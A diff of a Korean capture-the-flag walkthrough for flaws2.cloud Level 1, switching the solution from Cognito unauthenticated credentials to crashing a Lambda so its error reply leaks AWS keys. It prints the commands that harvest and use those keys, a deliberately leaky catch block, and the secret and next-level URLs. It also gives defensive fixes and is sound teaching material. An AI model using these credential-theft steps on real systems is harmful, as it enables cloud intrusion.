@@ -1,177 +1,176 @@
-# Attacker Level 1 — Cognito 미인증 자격증명으로 Lambda 소스 유출
+# Attacker Level 1 — Lambda 에러 응답에서 자격증명 탈취
 
 > **URL**: http://level1.flaws2.cloud/
-> **핵심 기술**: AWS Cognito Identity Pool (Unauthenticated) · Lambda 소스 추출
+> **API 엔드포인트**: https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1
+> **핵심 기술**: 클라이언트 측 유효성 검사 우회 · Lambda 환경변수 유출
 > **난이도**: ⭐⭐
 > **본인 AWS 계정 필요**: ❌
 
 ## 🎯 목표
 
-페이지는 **"4자리 PIN"** 을 요구한다. 공식 힌트는 "무작위 대입은 답이 아니다" 라고 못 박는다. 클라이언트 측 JS 와 Cognito Identity Pool 의 오설정을 결합해 **Lambda 함수 소스 코드** 를 꺼내 정답 PIN 을 찾는다.
+페이지는 **"4자리 PIN"** 을 요구한다. 공식 힌트는 "**brute force 는 답이 아니다**" 라고 못 박는다. 클라이언트 측 검증만 있는 허술한 입력 처리를 **숫자가 아닌 값**으로 우회해 Lambda 를 크래시시키고, 응답에 노출된 **실행 역할의 임시 자격증명**으로 비밀 페이지를 찾는다.
 
 ## 🧭 공식 힌트
 
 <details>
 <summary><b>Hint 1</b></summary>
 
-> 이 사이트는 **S3 정적 사이트 + API Gateway + Lambda** 로 구성돼 있습니다. 서버로 가는 요청을 먼저 관찰하세요.
+> 이 페이지의 입력 유효성 검사는 **JavaScript 에만** 있습니다. 이를 우회하고 숫자가 아닌 PIN 을 보내보세요.
 
 </details>
 
 <details>
 <summary><b>Hint 2</b></summary>
 
-> 페이지가 **Cognito Identity Pool** 을 사용하는 경우가 있습니다. `IdentityPoolId` 는 **클라이언트에 평문** 으로 있어야만 동작하죠. 그 값만으로도 **미인증 사용자** 자격으로 AWS 자격증명을 받을 수 있습니다.
+> 브라우저 콘솔에 보이는 요청 URL 은 `https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=1234` 입니다. `code` 를 `a` 로 바꿔 보세요. 서버가 내놓는 **에러 메시지** 를 주의 깊게 보세요.
 
 </details>
 
 <details>
 <summary><b>Hint 3</b></summary>
 
-> 그 자격증명으로 `aws lambda get-function` 을 시도해 보세요. 운이 좋으면 **함수 코드 zip 을 다운로드할 수 있는 URL** 이 돌려져 올 것입니다.
+> 응답에 **`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`** 이 들어 있습니다. AWS CLI 에 **환경변수** 로 설정하고 다음 레벨을 찾으세요.
 
 </details>
 
 ## 📚 사전 지식
 
-- **Cognito Identity Pool** 은 모바일·웹에서 "인증된 사용자 없이도 AWS 일부 API 를 호출" 하게 해 주는 장치다. 개발자가 `Unauthenticated role` 에 **과도한 권한** 을 주면 미인증 사용자에게도 광범위한 접근이 열린다.
-- `aws lambda get-function` 은 함수의 **Code.Location** 필드에 S3 pre-signed URL 을 돌려준다 → 다운로드하면 zip 소스.
-- 환경변수는 `aws lambda get-function-configuration` 으로도 조회된다.
+- Lambda 함수는 런타임 환경에서 **환경변수**에 자격증명을 심어 SDK 에 제공한다.
+- 디버그용으로 `catch (err) { return err.message + JSON.stringify(process.env); }` 같은 구현을 해 두면 **크래시 응답에 env 전체가 붙어나온다** — flaws2 L1 이 정확히 이 패턴.
+- `ASIA...` 로 시작하는 키는 **세션 토큰** 도 함께 있어야 사용 가능.
 
 ## 🔍 정찰
 
-### 1. 페이지 소스에서 API Gateway URL 찾기
+### 1. 페이지 소스에서 API 엔드포인트 확인
 ```bash
-curl -s http://level1.flaws2.cloud/ | grep -Eo 'execute-api[^"]+'
+curl -s http://level1.flaws2.cloud/ | grep -Eo 'execute-api[^"]+' | head -1
+# execute-api.us-east-1.amazonaws.com/default/level1
 ```
-예상:
-```
-https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1
-```
-리전은 **us-east-1** 이다.
 
-### 2. PIN 검증 엔드포인트 시험
+### 2. 정상 요청 (숫자) — 반응 확인
 ```bash
-curl -s "https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=0000"
-# 결과 예: "Incorrect code..."
+curl -s "https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=1234"
+# 페이지가 "Incorrect" 로 리다이렉트됨
 ```
-무한 brute force 는 의도된 길이 아님.
 
-### 3. 페이지가 Cognito 를 쓰는지 확인
-사이트 JS 를 확인하면 종종 `IdentityPoolId` 가 박혀 있다. flaws2 의 원래 코드엔 이 값이 없다고 알려져 있고, 공격자가 **리전·서비스 이름을 추론**해서 직접 시도하기도 한다. 대안 경로로 아래 Cognito 미인증 흐름을 사용한다:
+### 3. JS 검증 우회 — 숫자가 아닌 값 전송
+```bash
+curl -s "https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=a"
+```
 
 ## 🧨 취약점 원리
 
-Cognito Identity Pool 의 "Unauthenticated role" 에는 **최소권한**만 붙여야 하지만, 개발자들이 편의를 위해 다음과 같은 넓은 권한을 붙이는 일이 잦다:
-- `lambda:ListFunctions`, `lambda:GetFunction`
-- `s3:GetObject` 과 같은 와일드카드 리소스
-
-이 경우 공격자는 **회원가입조차 없이** AWS API 를 호출할 수 있다. 그리고 `lambda:GetFunction` 은 **함수 코드 zip 다운로드 URL** 을 리턴한다 — 이게 곧 **소스 유출** 이다.
+- **클라이언트 측에서만** 입력을 `isFinite(parseFloat(code))` 로 검증. 서버는 검증하지 않음.
+- Lambda 코드가 숫자가 아닌 값을 처리하다 예외 발생.
+- 예외 처리 로직이 "디버깅 편하라고" **`process.env` 를 그대로 직렬화**해 클라이언트로 되돌려줌 → **실행 역할 자격증명 외부 유출**.
 
 ## 🛠 풀이
 
-### 1. 식별 풀 ID 획득
-페이지 소스에 없다면, HackTricks 에서 공개된 flaws2 의 식별 풀 ID 를 사용한다(CTF 공개 정보):
-```
-IdentityPoolId: us-east-1:f77ca7cc-7bf8-4f32-96ec-d6bb48c7aa48
-```
-
-### 2. 미인증 identity 생성
+### 1. 환경변수 덤프 받기
 ```bash
-aws cognito-identity get-id \
-  --identity-pool-id us-east-1:f77ca7cc-7bf8-4f32-96ec-d6bb48c7aa48 \
-  --region us-east-1
-# { "IdentityId": "us-east-1:abcd1234-..." }
+curl -s "https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=a" > /tmp/l1env.txt
+cat /tmp/l1env.txt | head -c 200
+```
+응답 모양:
+```
+Error, malformed input
+{"AWS_REGION":"us-east-1","_HANDLER":"index.handler","AWS_ACCESS_KEY_ID":"ASIA...","AWS_SECRET_ACCESS_KEY":"...","AWS_SESSION_TOKEN":"...","AWS_LAMBDA_FUNCTION_NAME":"level1",...}
 ```
 
-### 3. 자격증명 받기
+### 2. JSON 부분만 추출해서 환경변수 셋업
 ```bash
-aws cognito-identity get-credentials-for-identity \
-  --identity-id us-east-1:abcd1234-... \
-  --region us-east-1
+# "Error, malformed input\n" 뒷부분이 JSON
+tail -c +24 /tmp/l1env.txt > /tmp/l1env.json
+jq -r '"export AWS_ACCESS_KEY_ID=\(.AWS_ACCESS_KEY_ID)
+export AWS_SECRET_ACCESS_KEY=\(.AWS_SECRET_ACCESS_KEY)
+export AWS_SESSION_TOKEN=\(.AWS_SESSION_TOKEN)"' /tmp/l1env.json > /tmp/l1creds.sh
+source /tmp/l1creds.sh
+aws sts get-caller-identity --region us-east-1
+# Arn: arn:aws:sts::653711331788:assumed-role/level1/level1
 ```
-응답에 `AccessKeyId`, `SecretKey`, `SessionToken` 이 들어 있다.
 
-### 4. 프로파일로 등록
+### 3. Lambda 역할로 접근 가능한 리소스 탐색
+`ListAllMyBuckets` 는 막혀 있지만, **도메인 규칙으로 레벨 버킷을 직접 지정**하면 `ListBucket` 이 통한다:
 ```bash
-export AWS_ACCESS_KEY_ID="ASIA..."
-export AWS_SECRET_ACCESS_KEY="..."
-export AWS_SESSION_TOKEN="..."
-export AWS_DEFAULT_REGION="us-east-1"
-
-aws sts get-caller-identity
-# Arn: arn:aws:sts::653711331788:assumed-role/Cognito_Level1Unauth_Role/CognitoIdentityCredentials
+aws s3 ls s3://level1.flaws2.cloud/ --region us-east-1
+```
+예상:
+```
+2018-11-21 11:00:22       1905 hint1.htm
+2018-11-21 11:00:22       2226 hint2.htm
+2018-11-21 11:00:22       2536 hint3.htm
+2018-11-21 11:00:22       2523 hint4.htm
+2018-11-21 11:00:17       1899 secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
 ```
 
-### 5. Lambda 함수 목록 & 소스 추출
+### 4. 비밀 페이지 열기
 ```bash
-aws lambda list-functions
-# ... FunctionName: "level1" ...
-aws lambda get-function --function-name level1
-# "Code": { "Location": "https://prod-iad-c2-starport-layer-bucket.s3.amazonaws.com/..." }
+curl -s http://level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html \
+  | grep -Eo 'level[0-9]-[^"]+flaws2\.cloud' | head -1
+# level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud
 ```
-그 URL 을 `curl` 로 받아 zip 을 풀면 `index.js` 가 나온다. 코드 속에 **정답 PIN** 이 하드코딩돼 있거나, **정답 시 리다이렉트할 비밀 URL** 이 박혀 있다.
-
-### 6. 시크릿 페이지
-공식 답의 secret URL:
-```
-http://level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
-```
-페이지에 **다음 레벨(Attacker Level 2) URL** 이 있다.
 
 ## 🚪 정답 & 다음 레벨
 
 <details>
 <summary>정답 펼치기</summary>
 
-- Secret: http://level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
-- 다음 레벨: **Attacker Level 2** (페이지 지시 따라 이동)
-- 교훈: Cognito Unauthenticated role 은 **최소권한**. 클라이언트에 심긴 ID 는 사실상 공개.
+- 비밀 페이지: http://level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
+- 다음 레벨: **http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud/**
+- 교훈:
+  1. **서버에서도** 입력 유효성 검증할 것.
+  2. **Lambda env 전체를 응답에 노출** 하는 디버그 코드 절대 금지.
+  3. Lambda 실행 역할은 **최소권한** — 이 레벨 역할은 굳이 `s3:ListBucket level1.flaws2.cloud` 가 없어도 됐다.
 
 </details>
 
 ## 🌍 실제 세계 사례
 
-- 2020 년 NotSoSecure 가 소개한 `Exploit AWS Cognito Misconfigurations` 보고서 — 수많은 모바일 앱의 Unauth role 에 `dynamodb:Scan`, `s3:GetObject` 가 붙어 있었다.
-- Bug Bounty 에서 "앱 APK 디컴파일 → Cognito Pool ID 추출 → 무인증 자격증명 획득 → 내부 데이터 열람" 의 보고가 지금도 꾸준히 접수된다.
+- 2022 년 Bug Bounty: 어느 SaaS 의 Lambda 가 에러 트래이스에 `process.env` 를 전체 포함 → Attacker 가 **LLM API 키 · DB 암호 · SES SMTP 비밀번호** 전부 수거.
+- 비슷하게 **Stack trace 에 환경변수** 가 실리는 프레임워크 (Rails `config/environments/development.rb` 등)에서 흔한 실수.
 
 ## 🛡 방어 대책
 
-### ① Unauthenticated role 의 Policy 를 **최소권한** 으로
-```json
-{
-  "Version": "2012-10-17",
-  "Statement": [
-    {
-      "Effect": "Allow",
-      "Action": ["mobileanalytics:PutEvents", "cognito-sync:*"],
-      "Resource": "*"
-    }
-  ]
+### ① 에러 응답에 환경변수/스택트레이스 노출 금지
+```javascript
+// 나쁜 예
+catch (err) { return { body: err.message + JSON.stringify(process.env) }; }
+
+// 좋은 예
+catch (err) {
+  console.error(err);  // CloudWatch 에만 기록
+  return { statusCode: 500, body: "Internal error" };
 }
 ```
-**Lambda/S3/DynamoDB 같은 데이터 서비스는 절대 허용하지 않는다.**
 
-### ② Identity Pool 에서 "Unauthenticated access" 아예 비활성
-필요 없다면 **인증된 Cognito User Pool 토큰** 만 교환하도록 설정.
+### ② 서버에서도 입력 검증
+```javascript
+if (!/^\d{4}$/.test(event.queryStringParameters.code)) {
+  return { statusCode: 400, body: "Invalid code" };
+}
+```
 
-### ③ Lambda 소스에 비밀 넣지 않기
-- **환경변수**에도 절대 PIN/API key 넣지 말 것 → Secrets Manager, Parameter Store 권장.
-- 빌드 시 최소화된 번들만 업로드해 소스 디버깅 정보 제거.
+### ③ 비밀은 환경변수가 아니라 Secrets Manager / Parameter Store
+```javascript
+import { SecretsManagerClient, GetSecretValueCommand } from "@aws-sdk/client-secrets-manager";
+const sm = new SecretsManagerClient({});
+const pin = (await sm.send(new GetSecretValueCommand({ SecretId: "level1/pin" }))).SecretString;
+```
+환경변수로 PIN 을 넣어 둔 CTF 같은 실수도 이 구조면 피할 수 있다.
 
-### ④ WAF / API Gateway 의 throttling
-정답 PIN 을 Lambda 로 넘기기 전 WAF 규칙으로 **/level1?code=** 경로 초당 요청 제한 → brute force 자체를 차단.
+### ④ WAF / API Gateway throttling
+`?code=` 에 정규식 조건 추가, 초당 요청 제한.
 
-### ⑤ CloudTrail 감시
-`cognito-identity:GetId`, `GetCredentialsForIdentity`, `lambda:GetFunction` 이 동일 IdentityId 에서 연속 발생하면 정찰 의심.
+### ⑤ CloudWatch Log 필터
+`AWS_ACCESS_KEY_ID` 가 응답에 포함되는 로그를 **Metric Filter 로 자동 탐지** 해 SNS 알림.
 
 ## ✅ 체크리스트
 
-- [ ] 페이지 소스에서 API URL 식별
-- [ ] `aws cognito-identity get-id` / `get-credentials-for-identity` 재현
-- [ ] `aws lambda get-function` 으로 소스 zip URL 획득
-- [ ] 소스를 열어 정답/비밀 URL 확인
-- [ ] 본인 Cognito Pool 의 Unauth role 정책 점검
+- [ ] 페이지 JS 에 클라이언트 검증만 있음을 DevTools 로 확인
+- [ ] `?code=a` 요청으로 환경변수 JSON 덤프 확인
+- [ ] `ASIA...` 키로 `aws sts get-caller-identity` 성공
+- [ ] `s3 ls level1.flaws2.cloud` 에서 `secret-ppxVFdw...` 확인
+- [ ] 본인 Lambda 에 동일 취약(env 덤프) 함수 작성 → CloudWatch 필터로 탐지 테스트
 
 ## ⏭ 다음
 
